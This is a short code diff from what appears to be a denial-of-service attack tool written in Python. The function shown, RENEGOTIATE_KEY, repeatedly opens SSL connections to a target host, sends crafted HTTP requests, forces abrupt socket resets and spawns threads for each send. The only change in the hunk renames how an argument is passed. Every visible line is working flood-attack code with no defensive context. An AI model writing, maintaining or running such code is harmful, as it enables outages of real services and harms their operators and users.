@@ -19,7 +19,7 @@ def RENEGOTIATE_KEY(target,methods,duration_sec_attack_dude,byt):
              s.connect((str(target['host']),int(target['port'])))
              s.connect_ex((str(target['host']),int(target['port'])))
              ssl_socket = ssl.SSLContext().wrap_socket(s,server_hostname=target['host'])
-             url_path = generate_url_path(1)
+             url_path = generate_url_path(num=1)
              byt2 = f"{methods} /{url_path} HTTP/1.1\nHost: {target['host']}\n\n\r\r".encode()
              ssl_socket.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,struct.pack('ii', 0, 1))
              threading.Thread(target=RENEGOTIATE_SEND,args=(ssl_socket,byt2,byt)).start()
